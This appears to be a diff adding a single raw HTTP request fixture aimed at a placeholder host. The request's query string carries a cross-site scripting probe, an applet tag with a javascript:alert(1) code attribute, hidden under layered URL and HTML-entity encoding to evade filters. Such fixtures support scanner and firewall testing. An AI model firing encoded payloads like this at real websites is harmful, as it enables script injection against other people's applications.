@@ -1,0 +1,4 @@
+GET /a?id=%26%23x3C;applet%20code%3D%26%23x22;javascript:alert(1)%26%23x22;%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
